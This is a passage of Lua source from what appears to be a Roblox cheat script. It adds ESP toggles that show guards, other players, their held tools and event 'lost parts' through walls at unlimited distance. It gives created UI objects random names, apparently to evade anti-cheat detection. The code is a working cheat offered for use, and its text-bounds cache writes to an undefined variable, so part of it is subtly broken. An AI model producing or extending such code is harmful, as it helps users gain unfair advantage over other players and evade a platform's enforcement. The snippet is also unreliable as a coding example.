				drawingTheme.SetRow(drawing.StateRow, getGuardStateText(guardModel), palette)
			end

			local function updateGuardBillboardSize(drawing)
				local floor = math.floor
				drawing.Tag.Size = UDim2.fromOffset(drawingTheme.ScaledWidth(115, guardEspSizeScale), floor(drawingTheme.RowHeight(guardEspSizeScale) * 1.6))
			end

			local function cleanupGuardDrawing(guardModel)
				local drawing = activeGuardDrawings[guardModel]
				if not drawing then
					return
				end
				activeGuardDrawings[guardModel] = nil
				drawingTheme.DisconnectAll(drawing.Connections)
				drawing.Highlight:Destroy()
				drawing.Tag:Destroy()
			end

			local function createGuardDrawing(areaName, adornee)
				if activeGuardDrawings[adornee] then
					return
				end
				local rootPart = drawingTheme.FindGuardRoot(adornee)
				if not rootPart then
					return
				end

				if not guardScreenGui or not guardScreenGui.Parent then
					guardScreenGui = drawingTheme.CreateRuntime()
				end

				local highlight = Instance.new("Highlight")
				highlight.Name = generateRandomKey()
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillTransparency = 0.76
				highlight.OutlineTransparency = 0.02
				highlight.Adornee = adornee
				highlight.Parent = guardScreenGui
				local ok, boundingBox, size = pcall(adornee.GetBoundingBox, adornee)
				local hasBoundingBox = ok and typeof(boundingBox) == "CFrame"
				local yOffset = 6

				if hasBoundingBox then
					yOffset = boundingBox.Position.Y + size.Y * 0.5 - rootPart.Position.Y + guardYOffset
				end

				local billboardGui, frame = drawingTheme.CreateTag(guardScreenGui, math.huge)
				billboardGui.Adornee = rootPart
				billboardGui.StudsOffsetWorldSpace = Vector3.new(0, yOffset, 0)
				local nameRow = drawingTheme.CreateTextRow(frame, drawingTheme.StatusFont, 1, 0.45)
				local stateRow = drawingTheme.CreateTextRow(frame, drawingTheme.StatusFont, 2, 0.55)
				local sheen = drawingTheme.Palettes.Sheen
				drawingTheme.SetRow(nameRow, tostring(areaName) .. " Guard", sheen)
				local drawing = { Highlight = highlight, Tag = billboardGui, StateRow = stateRow, Connections = {} }
				activeGuardDrawings[adornee] = drawing
				updateGuardBillboardSize(drawing)
				updateGuardDrawingState(drawing, adornee)

				local function onStateChanged()
					updateGuardDrawingState(drawing, adornee)
				end

				table.insert(drawing.Connections, adornee:GetAttributeChangedSignal("GuardState"):Connect(onStateChanged))
				table.insert(drawing.Connections, adornee:GetAttributeChangedSignal("TargetPlayer"):Connect(onStateChanged))

				table.insert(drawing.Connections, adornee.AncestryChanged:Connect(function()
					if not adornee:IsDescendantOf(workspace) then
						cleanupGuardDrawing(adornee)
					end
				end))
			end

			local function clearAllGuardDrawings()
				isGuardEspEnabled = false
				drawingTheme.DisconnectAll(guardConnections)

				for guardModel in pairs(activeGuardDrawings) do
					cleanupGuardDrawing(guardModel)
				end

				if guardScreenGui then
					guardScreenGui:Destroy()
					guardScreenGui = nil
				end
			end

			local function enableGuardEsp()
				if isGuardEspEnabled then
					return
				end
				isGuardEspEnabled = true
				guardConnections = drawingTheme.WatchGuards(createGuardDrawing)
			end

			local guardEspToggle = nil
			local guardEspDefault = false
			local isSyncingGuardEsp = false

			local function syncGuardEspState()
				if isSyncingGuardEsp then
					return
				end

				if drawingTheme.ReadToggle(guardEspToggle, guardEspDefault) then
					enableGuardEsp()
				elseif isGuardEspEnabled then
					clearAllGuardDrawings()
				end
			end

			trackCleanup(function()
				isSyncingGuardEsp = true
				clearAllGuardDrawings()
			end)

			guardEspToggle = espSection:CreateToggle({
				Name = "ESP Guards",
				Default = false,
				Callback = function(arg)
					guardEspDefault = arg == true
					drawingTheme.SyncSoon(syncGuardEspState)
				end,
			})

			espSection:CreateSlider({
				Name = "ESP Guard Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = guardEspToggle,
				Callback = function(arg)
					local num = tonumber(arg)

					if num and guardEspSizeScale ~= num / 100 then
						guardEspSizeScale = num / 100

						for _, drawing in pairs(activeGuardDrawings) do
							updateGuardBillboardSize(drawing)
						end
					end
				end,
			})
		end

		do
			local lostPartsInfo = {
				{ Id = "LostPart1", Label = "Mechanical Gear" },
				{ Id = "LostPart2", Label = "Wiring Harness" },
			}

			local collectedPalette = drawingTheme.PaletteFromColor(Color3.fromRGB(255, 216, 61))
			local accentPalette = drawingTheme.Palettes.Accent
			local lostPartGui = nil
			local activeLostPartDrawings = {}
			local isLostPartEspEnabled = false
			local lostPartUpdateConnection = nil
			local lostPartEspToggle = nil
			local lostPartEspDefault = false
			local isSyncingLostPartEsp = false

			local function cleanupLostPartDrawing(partId)
				local drawing = activeLostPartDrawings[partId]
				if not drawing then
					return
				end
				activeLostPartDrawings[partId] = nil

				pcall(function()
					drawing.Highlight:Destroy()
					drawing.Tag:Destroy()
				end)
			end

			local function updateLostPartDrawings()
				local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")

				for _, partInfo in ipairs(lostPartsInfo) do
					local partModel = drScrambleEvent and drScrambleEvent:FindFirstChild(partInfo.Id)
					local hitbox = partModel and (partModel:FindFirstChild("Hitbox", true) or partModel.PrimaryPart or partModel:FindFirstChildWhichIsA("BasePart", true))
					local drawing = activeLostPartDrawings[partInfo.Id]

					if drawing and (drawing.Model ~= partModel or not hitbox) then
						cleanupLostPartDrawing(partInfo.Id)
						drawing = nil
					end

					if hitbox and not drawing then
						if not lostPartGui or not lostPartGui.Parent then
							lostPartGui = drawingTheme.CreateRuntime()
						end

						local highlight = Instance.new("Highlight")
						highlight.Name = generateRandomKey()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.7
						highlight.OutlineTransparency = 0.02
						highlight.Adornee = partModel
						highlight.Parent = lostPartGui
						local billboard, frame = drawingTheme.CreateTag(lostPartGui, 25000)
						billboard.Adornee = hitbox
						billboard.StudsOffsetWorldSpace = Vector3.new(0, 4, 0)
						local floor = math.floor
						billboard.Size = UDim2.fromOffset(drawingTheme.ScaledWidth(160), floor(drawingTheme.RowHeight() * 1.6))
						local nameRow = drawingTheme.CreateTextRow(frame, drawingTheme.StatusFont, 1, 0.5)
						local infoRow = drawingTheme.CreateTextRow(frame, drawingTheme.StatusFont, 2, 0.5)
						drawingTheme.SetRow(nameRow, partInfo.Label, drawingTheme.Palettes.Sheen)
						drawing = { Model = partModel, Hitbox = hitbox, Highlight = highlight, Tag = billboard, InfoRow = infoRow }
						activeLostPartDrawings[partInfo.Id] = drawing
					end

					if drawing then
						local isCollected = type(chilliState.ScrambleLostPart) == "function" and chilliState.ScrambleLostPart(partInfo.Id) == true
						local palette = isCollected and accentPalette or collectedPalette
						drawingTheme.SetRow(drawing.InfoRow, isCollected and "Collected" or string.format("%d studs", math.floor(chilliState.DistanceTo(drawing.Hitbox.Position))), palette)
						drawing.Highlight.FillColor = palette.Outline
						drawing.Highlight.OutlineColor = palette.Outline
					end
				end
			end

			local function clearAllLostPartDrawings()
				isLostPartEspEnabled = false

				if lostPartUpdateConnection then
					lostPartUpdateConnection:Disconnect()
					lostPartUpdateConnection = nil
				end

				for partId in pairs(activeLostPartDrawings) do
					cleanupLostPartDrawing(partId)
				end

				if lostPartGui then
					lostPartGui:Destroy()
					lostPartGui = nil
				end
			end

			local function enableLostPartEsp()
				if isLostPartEspEnabled then
					return
				end
				isLostPartEspEnabled = true
				local updateTimer = 1

				lostPartUpdateConnection = RunService.Heartbeat:Connect(function(deltaTime)
					updateTimer += deltaTime

					if updateTimer >= 0.3 then
						updateTimer = 0
						pcall(updateLostPartDrawings)
					end
				end)
			end

			local function syncLostPartEspState()
				if isSyncingLostPartEsp then
					return
				end

				if drawingTheme.ReadToggle(lostPartEspToggle, lostPartEspDefault) then
					enableLostPartEsp()
				elseif isLostPartEspEnabled then
					clearAllLostPartDrawings()
				end
			end

			trackCleanup(function()
				isSyncingLostPartEsp = true
				clearAllLostPartDrawings()
			end)

			lostPartEspToggle = espSection:CreateToggle({
				Name = "ESP Lost Parts",
				Default = false,
				Callback = function(arg)
					lostPartEspDefault = arg == true
					drawingTheme.SyncSoon(syncLostPartEspState)
				end,
			})
		end

		local TextService
		TextService = game:GetService("TextService")
		local font
		font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
		local nameGradientColors

		do
			local colorSequence = ColorSequence.new
			local keypoints = {}
			local keypoint1 = ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 255, 205))
			local keypoint2 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 225, 255))
			keypoints[1] = keypoint1
			keypoints[2] = keypoint2

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(210, 135, 255)))
				table.move(values, 1, values.n, 3, keypoints)
			end

			nameGradientColors = colorSequence(keypoints)
		end

		local strokeGradientColors = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 73, 66)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 17, 79)),
		})

		local isPlayerEspEnabled = false
		local playerUpdateTimer = 0
		local playerEspGui = nil
		local activePlayerDrawings = {}
		local playerConnections = {}
		local playerAvatars = {}
		local playerEspSizeScale, playerEspConfig, playerEspToggle, playerEspDefault, isSyncingPlayerEsp

		do
			local textBoundsCache = {}
			playerEspSizeScale = 0.75
			playerEspConfig = { Name = true, Username = false, Avatar = false, Tool = true }
			playerEspToggle = nil
			playerEspDefault = false
			isSyncingPlayerEsp = false

			local function formatTextureId(textureValue)
				local textureStr = tostring(textureValue or "")
				if textureStr:match("^%d+$") then
					return "rbxassetid://" .. textureStr
				end
				return textureStr
			end

			local function getToolTextureId(tool)
				if not tool or not tool:IsA("Tool") then
					return ""
				end
				local textureId = formatTextureId(tool.TextureId)
				if textureId ~= "" then
					return textureId
				end

				for _, attributeName in ipairs({ "Icon", "Image", "Thumbnail", "TextureId" }) do
					local attribute = tool:GetAttribute(attributeName)
					if type(attribute) == "string" and formatTextureId(attribute) ~= "" then
						return formatTextureId(attribute)
					end
				end

				for _, descendant in ipairs(tool:GetDescendants()) do
					if descendant:IsA("Decal") or descendant:IsA("Texture") then
						textureId = formatTextureId(descendant.Texture)
					elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
						textureId = formatTextureId(descendant.Image)
					end

					if textureId ~= "" then
						return textureId
					end
				end

				return ""
			end

			local function getPlayerBillboardHeight()
				local currentCamera = workspace.CurrentCamera
				return math.max(1, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.024, 26, 35) * playerEspSizeScale))
			end

			local function getTextBounds(text, size)
				local cacheKey = text .. "@" .. size
				local cached = textBoundsCache[cacheKey]
				if cached then
					return cached
				end
				local getTextBoundsParams = Instance.new("GetTextBoundsParams")
				getTextBoundsParams.Text = text
				getTextBoundsParams.Font = font
				getTextBoundsParams.Size = size
				getTextBoundsParams.Width = 1000

				local ok, result = pcall(function()
					return TextService:GetTextBoundsAsync(getTextBoundsParams)
				end)

				getTextBoundsParams:Destroy()
				ok = ok and result.X

				if not ok then
					ok = (utf8.len(text) or #text) * size * 0.56
				end

				textBoundsCache[str] = ok
				return ok
			end

			local function applyStroke(uiStroke, strokeColor, scaledThickness, offsetThickness)
				uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
				uiStroke.Color = strokeColor
				uiStroke.LineJoinMode = Enum.LineJoinMode.Round
				uiStroke.Transparency = 0

				uiStroke.Thickness = pcall(function()
					uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
				end) and scaledThickness or offsetThickness
			end

			local function createTextLabel(parent, zIndex)
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = generateRandomKey()
				textLabel.AnchorPoint = Vector2.new(0, 0.5)
				textLabel.BackgroundTransparency = 1
				textLabel.FontFace = font
				textLabel.Text = ""
				textLabel.TextScaled = true
				textLabel.TextStrokeTransparency = 1
				textLabel.TextXAlignment = Enum.TextXAlignment.Center
				textLabel.TextYAlignment = Enum.TextYAlignment.Center
				textLabel.ZIndex = zIndex
				textLabel.Parent = parent
				return textLabel
			end

			local function createImageLabel(parent, zIndex)
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = generateRandomKey()
				imageLabel.AnchorPoint = Vector2.new(0, 0.5)
				imageLabel.BackgroundTransparency = 1
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.ZIndex = zIndex
				imageLabel.Parent = parent
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = generateRandomKey()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.Parent = imageLabel
				return imageLabel
			end

			local function updatePlayerDrawingLayout(drawing)
				local height = getPlayerBillboardHeight()
				local showName = playerEspConfig.Name == true or playerEspConfig.Username == true
				local showAvatar = playerEspConfig.Avatar == true
				local showTool = playerEspConfig.Tool == true and drawing.ToolIcon.Image ~= ""
				local avatarSize = showAvatar and math.floor(height * 0.72) or 0
				local toolSize = showTool and math.floor(height * 0.82) or 0
				local nameHeight = math.floor(height * 0.7)
				local spacing = math.max(1, math.floor(height * 0.04))
				local name = playerEspConfig.Username == true and drawing.Player.Name or drawing.Player.DisplayName
				drawing.Name.Text = name
				drawing.Shadow.Text = name
				local nameWidth = showName and math.floor(math.clamp(getTextBounds(name, nameHeight) + 4, nameHeight, 230)) or 0
				local currentX = 0
				local avatarX = 0

				if showAvatar then
					currentX = 0 + avatarSize
				end

				local nameX = 0

				if showName then
					if not (currentX > 0) then
						nameX = currentX
					else
						nameX = currentX + spacing
					end

					currentX = nameX + nameWidth
				end

				local toolX = 0

				if showTool then
					if not (currentX > 0) then
						toolX = currentX
					else
						toolX = currentX + spacing
					end

					currentX = toolX + toolSize
				end

				local totalWidth = math.max(currentX, 1)
				local widthScale = 1 / totalWidth
				local heightScale = 1 / height
				drawing.Billboard.Size = UDim2.fromOffset(totalWidth, height)
				drawing.Avatar.Visible = showAvatar
				drawing.Name.Visible = showName
				drawing.Shadow.Visible = showName
				drawing.ToolIcon.Visible = showTool
				drawing.ToolShadow.Visible = showTool
				drawing.Avatar.Position = UDim2.fromScale(avatarX / totalWidth, 0.5)
				drawing.Avatar.Size = UDim2.fromScale(avatarSize / totalWidth, avatarSize / height)
				drawing.Name.Position = UDim2.fromScale(nameX / totalWidth, 0.5)
				drawing.Name.Size = UDim2.fromScale(nameWidth / totalWidth, nameHeight / height)
				drawing.Shadow.Position = UDim2.fromScale(nameX / totalWidth + widthScale, 0.5 + heightScale)
				drawing.Shadow.Size = drawing.Name.Size
				drawing.ToolIcon.Position = UDim2.fromScale(toolX / totalWidth, 0.5)
				drawing.ToolIcon.Size = UDim2.fromScale(toolSize / totalWidth, toolSize / height)
				drawing.ToolShadow.Position = UDim2.fromScale(toolX / totalWidth + widthScale, 0.5 + heightScale)
				drawing.ToolShadow.Size = drawing.ToolIcon.Size
			end

			local function createPlayerDrawing(player, character, head, rootPart)
				local highlight = Instance.new("Highlight")
				highlight.Name = generateRandomKey()
				highlight.Adornee = character
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillColor = Color3.fromRGB(0, 67, 148)
				highlight.FillTransparency = 0.76
				highlight.OutlineColor = Color3.fromRGB(72, 207, 255)
				highlight.OutlineTransparency = 0.02
				highlight.Parent = playerEspGui
				rootPart = rootPart or head
				local yOffset = 3.1

				if rootPart ~= head then
					yOffset = math.clamp(head.Position.Y - rootPart.Position.Y + 3.1, 3.8, 6)
				end

				local billboardGui = Instance.new("BillboardGui")
				billboardGui.Name = generateRandomKey()
				billboardGui.Adornee = rootPart
				billboardGui.AlwaysOnTop = true
				billboardGui.LightInfluence = 0
				billboardGui.MaxDistance = math.huge
				billboardGui.Size = UDim2.fromOffset(1, 1)
				billboardGui.StudsOffsetWorldSpace = Vector3.new(0, yOffset, 0)
				billboardGui.Parent = playerEspGui
				local frame = Instance.new("Frame")
				frame.Name = generateRandomKey()
				frame.Size = UDim2.fromScale(1, 1)
				frame.BackgroundTransparency = 1
				frame.Parent = billboardGui
				local avatarImg = createImageLabel(frame, 2)
				avatarImg.ScaleType = Enum.ScaleType.Crop
				local uiCorner = Instance.new("UICorner")
				uiCorner.Name = generateRandomKey()
				uiCorner.CornerRadius = UDim.new(1, 0)
				uiCorner.Parent = avatarImg
				local shadowTxt = createTextLabel(frame, 1)
				shadowTxt.TextColor3 = Color3.fromRGB(7, 19, 34)
				shadowTxt.TextTransparency = 0.05
				local nameTxt = createTextLabel(frame, 2)
				nameTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Name = generateRandomKey()
				applyStroke(uiStroke, Color3.fromRGB(255, 255, 255), 0.044, 1.4)
				uiStroke.Parent = nameTxt
				local strokeGrad = Instance.new("UIGradient")
				strokeGrad.Name = generateRandomKey()
				strokeGrad.Color = strokeGradientColors
				strokeGrad.Rotation = 90
				strokeGrad.Parent = uiStroke
				local nameGrad = Instance.new("UIGradient")
				nameGrad.Name = generateRandomKey()
				nameGrad.Color = nameGradientColors
				nameGrad.Rotation = 90
				nameGrad.Parent = nameTxt
				local toolShadow = createImageLabel(frame, 1)
				toolShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
				toolShadow.ImageTransparency = 0.35

				local drawing = {
					Player = player,
					Highlight = highlight,
					Billboard = billboardGui,
					Avatar = avatarImg,
					Shadow = shadowTxt,
					Name = nameTxt,
					ToolShadow = toolShadow,
					ToolIcon = createImageLabel(frame, 2),
				}

				updatePlayerDrawingLayout(drawing)
				return drawing
			end

			local function restoreNameDistance(playerDrawing)
				if playerDrawing.NameHumanoid and playerDrawing.NameHumanoid.Parent and playerDrawing.NameDistance ~= nil then
					pcall(function()
						playerDrawing.NameHumanoid.NameDisplayDistance = playerDrawing.NameDistance
					end)
				end

				playerDrawing.NameHumanoid = nil
				playerDrawing.NameDistance = nil
			end

			local function hideNameDistance(playerDrawing, character)
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not humanoid then
					return
				end

				if playerDrawing.NameHumanoid ~= humanoid then
					restoreNameDistance(playerDrawing)
					playerDrawing.NameHumanoid = humanoid
					playerDrawing.NameDistance = humanoid.NameDisplayDistance
				end

				pcall(function()
					humanoid.NameDisplayDistance = 0
				end)
			end

			local function cleanupPlayerCharacter(playerDrawing)
				drawingTheme.DisconnectAll(playerDrawing.CharacterConnections)

				if playerDrawing.Tag then
					pcall(function()
						playerDrawing.Tag.Highlight:Destroy()
					end)

					pcall(function()
						playerDrawing.Tag.Billboard:Destroy()
					end)

					playerDrawing.Tag = nil
				end

				restoreNameDistance(playerDrawing)
				playerDrawing.Character = nil
			end

			local function updatePlayerTool(playerDrawing)
				if not playerDrawing.Tag or not playerDrawing.Character then
					return
				end
				local toolTextureId = getToolTextureId(playerDrawing.Character:FindFirstChildOfClass("Tool"))
				playerDrawing.Tag.ToolIcon.Image = toolTextureId
				playerDrawing.Tag.ToolShadow.Image = toolTextureId
				updatePlayerDrawingLayout(playerDrawing.Tag)
			end

			local function fetchPlayerAvatar(playerDrawing, player, version)
				local image = playerAvatars[player.UserId]

				if image == nil then
					local ok, result = pcall(function()
						return Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
					end)

					image = ok and result or ""
					playerAvatars[player.UserId] = image
				end

				if isPlayerEspEnabled and playerDrawing.Version == version and playerDrawing.Tag then
					playerDrawing.Tag.Avatar.Image = image
				end
			end

			local function setupPlayerCharacter(playerDrawing, player, character)
				cleanupPlayerCharacter(playerDrawing)
				playerDrawing.Version = playerDrawing.Version + 1
				local version = playerDrawing.Version
				if not isPlayerEspEnabled or not character then
					return
				end
				playerDrawing.Character = character

				task.spawn(function()
					local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 5)
					if not isPlayerEspEnabled or playerDrawing.Version ~= version or not head or not head:IsA("BasePart") or not character:IsDescendantOf(workspace) then
						return
					end

					if not playerEspGui or not playerEspGui.Parent then
						playerEspGui = drawingTheme.CreateRuntime()
					end

					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					playerDrawing.Tag = createPlayerDrawing(player, character, head, humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart or nil)
					hideNameDistance(playerDrawing, character)

					local function onToolOrHumanoidChanged()
						task.defer(function()
							if isPlayerEspEnabled and playerDrawing.Version == version then
								updatePlayerTool(playerDrawing)
							end
						end)
					end

					table.insert(playerDrawing.CharacterConnections, character.ChildAdded:Connect(function(child)
						if child:IsA("Tool") then
							onToolOrHumanoidChanged()
						elseif child:IsA("Humanoid") then
							hideNameDistance(playerDrawing, character)
						end
					end))

					table.insert(playerDrawing.CharacterConnections, character.ChildRemoved:Connect(function(child)
						if child:IsA("Tool") then
							onToolOrHumanoidChanged()
						end
					end))

					table.insert(playerDrawing.CharacterConnections, character.AncestryChanged:Connect(function()
						if playerDrawing.Version == version and not character:IsDescendantOf(workspace) then
							playerDrawing.Version = playerDrawing.Version + 1
							cleanupPlayerCharacter(playerDrawing)
						end
					end))

					updatePlayerTool(playerDrawing)
					fetchPlayerAvatar(playerDrawing, player, version)
				end)
			end

			local function cleanupPlayer(player)
				local playerDrawing = activePlayerDrawings[player]
				if not playerDrawing then
					return
				end
				playerDrawing.Version = playerDrawing.Version + 1
				cleanupPlayerCharacter(playerDrawing)
				drawingTheme.DisconnectAll(playerDrawing.PlayerConnections)
				activePlayerDrawings[player] = nil
			end

			local function setupPlayer(player)
				if player == localPlayer or activePlayerDrawings[player] then
					return
				end

				local playerDrawing = {
					Version = 0,
					Character = nil,
					Tag = nil,
					NameHumanoid = nil,
					NameDistance = nil,
					CharacterConnections = {},
					PlayerConnections = {},
				}

				activePlayerDrawings[player] = playerDrawing

				table.insert(playerDrawing.PlayerConnections, player.CharacterAdded:Connect(function(character)
					setupPlayerCharacter(playerDrawing, player, character)
				end))

				table.insert(playerDrawing.PlayerConnections, player.CharacterRemoving:Connect(function(character)
					if playerDrawing.Character == character then
						playerDrawing.Version = playerDrawing.Version + 1
						cleanupPlayerCharacter(playerDrawing)
					end
				end))

				setupPlayerCharacter(playerDrawing, player, player.Character)
			end

			local function updateAllPlayerLayouts()
				for _, playerDrawing in pairs(activePlayerDrawings) do
					if playerDrawing.Tag then
						updatePlayerDrawingLayout(playerDrawing.Tag)
					end
				end
			end

			local function disablePlayerEsp()
				isPlayerEspEnabled = false
				playerUpdateTimer += 1
				drawingTheme.DisconnectAll(playerConnections)
				local playerList = {}

				for k in pairs(activePlayerDrawings) do
					table.insert(playerList, k)
				end

				for _, p in ipairs(playerList) do
					cleanupPlayer(p)
				end

				if playerEspGui then
					playerEspGui:Destroy()
					playerEspGui = nil
				end
			end

			local function enablePlayerEsp()
				if isPlayerEspEnabled then
					return
				end
				isPlayerEspEnabled = true
				playerUpdateTimer += 1
				local currentTimer = playerUpdateTimer
				playerEspGui = drawingTheme.CreateRuntime()

				for _, player in ipairs(Players:GetPlayers()) do
					setupPlayer(player)
				end

				table.insert(playerConnections, Players.PlayerAdded:Connect(setupPlayer))
				table.insert(playerConnections, Players.PlayerRemoving:Connect(cleanupPlayer))
				local currentCamera = workspace.CurrentCamera

				if currentCamera then
					table.insert(playerConnections, currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateAllPlayerLayouts))
				end

				task.spawn(function()
					while true do
						if isPlayerEspEnabled and currentTimer == playerUpdateTimer then
							task.wait(1)

							if not (not isPlayerEspEnabled or currentTimer ~= playerUpdateTimer) then
								for player, drawing in pairs(activePlayerDrawings) do
									local character = player.Character
									local adornee = drawing.Tag and drawing.Tag.Billboard.Parent and drawing.Tag.Billboard.Adornee and drawing.Tag.Billboard.Adornee:IsDescendantOf(workspace)

									if character and character:IsDescendantOf(workspace) and (drawing.Character ~= character or not adornee) then
										setupPlayerCharacter(drawing, player, character)
									end
								end

								continue
							end
						end

						break
					end
				end)
			end

			local function syncPlayerEspState()
				if isSyncingPlayerEsp then
					return
				end

				if drawingTheme.ReadToggle(playerEspToggle, playerEspDefault) then
					enablePlayerEsp()
				elseif isPlayerEspEnabled then
					disablePlayerEsp()
				end
			end

			trackCleanup(function()
				isSyncingPlayerEsp = true
				disablePlayerEsp()
			end)

			playerEspToggle = espSection:CreateToggle({
				Name = "ESP Players",
				Default = false,
				Callback = function(arg)
					playerEspDefault = arg == true
					drawingTheme.SyncSoon(syncPlayerEspState)
				end,
			})

			hookDropdownAllLabel(espSection:CreateMultiDropdown({
				Name = "ESP Player Info",
				Options = { "Name", "Username", "Avatar", "Tool" },
				Default = { "Name", "Tool" },
				SubOf = playerEspToggle,
				Callback = function(arg)
					local infoSet = { Name = false, Username = false, Avatar = false, Tool = false }

					if type(arg) == "table" then
						for k, configVal in pairs(arg) do
							if type(configVal) == "string" and infoSet[configVal] ~= nil then
								infoSet[configVal] = true
							elseif type(k) == "string" and configVal == true and infoSet[k] ~= nil then
								infoSet[k] = true
							end
						end
					end

					playerEspConfig = infoSet
					updateAllPlayerLayouts()
				end,
			}))

			espSection:CreateSlider({
				Name = "ESP Player Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = playerEspToggle,
				Callback = function(arg)
					local num = tonumber(arg)

					if num and playerEspSizeScale ~= num / 100 then
						playerEspSizeScale = math.clamp(num / 100, 0.5, 2)
						updateAllPlayerLayouts()
					end
				end,
			})
		end
	end

	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local tweenInfo2 = TweenInfo.new(0.24, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
	local tweenInfo3 = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
	local tweenInfo4 = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local tweenInfo5 = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local TweenService = game:GetService("TweenService")
	local color3 = Color3.fromRGB

	local function createColorSequence(keypointsList)
		local keypoints = {}

		for i, keyData in ipairs(keypointsList) do
			keypoints[i] = ColorSequenceKeypoint.new(keyData[1], keyData[2])
		end

		return ColorSequence.new(keypoints)
	end

	local stateThemes = {}

	do
		local hud = {}
		local hudKeypoints = {}
		local hudKey1 = { 0, color3(0, 118, 255) }
		local hudKey2 = { 1, color3(72, 204, 255) }
		hudKeypoints[1] = hudKey1
		hudKeypoints[2] = hudKey2
		hud.Color = createColorSequence(hudKeypoints)
		hud.Rotation = -90
		hud.Stroke = color3(0, 28, 76)
		hud.Light = color3(172, 226, 255)
		stateThemes.Hud = hud
	end

	do
		local steal = {}
		local stealKeypoints = {}
		local stealKey1 = { 0, color3(60, 255, 0) }
		local stealKey2 = { 1, color3(136, 255, 0) }
		stealKeypoints[1] = stealKey1
		stealKeypoints[2] = stealKey2
		steal.Color = createColorSequence(stealKeypoints)
		steal.Rotation = -90
		steal.Stroke = color3(11, 72, 0)
		steal.Light = color3(190, 255, 180)
		stateThemes.Steal = steal
	end

	do
		local queued = {}
		local queuedKeypoints = {}
		local queuedKey1 = { 0, color3(118, 118, 132) }
		local queuedKey2 = { 1, color3(172, 172, 186) }
		queuedKeypoints[1] = queuedKey1
		queuedKeypoints[2] = queuedKey2
		queued.Color = createColorSequence(queuedKeypoints)
		queued.Rotation = -90
		queued.Stroke = color3(28, 28, 34)
		queued.Light = color3(214, 214, 226)
		stateThemes.Queued = queued
	end

	do
		local priorityOn = {}
		local priorityKeypoints = {}
		local priorityKey1 = { 0, color3(255, 247, 0) }
		local priorityKey2 = { 1, color3(255, 136, 0) }
		priorityKeypoints[1] = priorityKey1
		priorityKeypoints[2] = priorityKey2
		priorityOn.Color = createColorSequence(priorityKeypoints)
		priorityOn.Rotation = 90
		priorityOn.Stroke = color3(0, 0, 0)
		priorityOn.Light = color3(132, 112, 0)
		stateThemes.PriorityOn = priorityOn
	end

	do
		local cancel = {}
		local cancelKeypoints = {}
		local cancelKey1 = { 0, color3(214, 17, 17) }
		local cancelKey2 = { 1, color3(253, 20, 20) }
		cancelKeypoints[1] = cancelKey1
		cancelKeypoints[2] = cancelKey2
		cancel.Color = createColorSequence(cancelKeypoints)
		cancel.Rotation = -90
		cancel.Stroke = color3(72, 0, 0)
		cancel.Light = color3(255, 103, 103)
		stateThemes.Cancel = cancel
	end

	do
		local chilli = {}
		local chilliKeypoints = {}
		local chilliKey1 = { 0, color3(132, 74, 255) }
		local chilliKey2 = { 0.34, color3(178, 74, 255) }
		local chilliKey3 = { 0.6, color3(255, 104, 206) }
		local chilliKey4 = { 0.78, color3(255, 168, 232) }
		local chilliKey5 = { 1, color3(146, 66, 255) }
		chilliKeypoints[1] = chilliKey1
		chilliKeypoints[2] = chilliKey2
		chilliKeypoints[3] = chilliKey3
		chilliKeypoints[4] = chilliKey4
		chilliKeypoints[5] = chilliKey5
		chilli.Color = createColorSequence(chilliKeypoints)
		chilli.Rotation = -115
		chilli.Stroke = color3(44, 10, 80)
		chilli.Light = color3(226, 178, 255)
		stateThemes.Chilli = chilli
	end

	local getEggProps

	do
		local secretKeypoints = {}
		local secretKey1 = { 0, color3(255, 255, 255) }
		local secretKey2 = { 0.2, color3(206, 212, 224) }
		local secretKey3 = { 0.42, color3(74, 80, 94) }
		local secretKey4 = { 0.58, color3(42, 46, 56) }
		local secretKey5 = { 0.78, color3(158, 166, 182) }
		local secretKey6 = { 1, color3(250, 252, 255) }
		secretKeypoints[1] = secretKey1
		secretKeypoints[2] = secretKey2
		secretKeypoints[3] = secretKey3
		secretKeypoints[4] = secretKey4
		secretKeypoints[5] = secretKey5
		secretKeypoints[6] = secretKey6
		local secretGradientColors = createColorSequence(secretKeypoints)
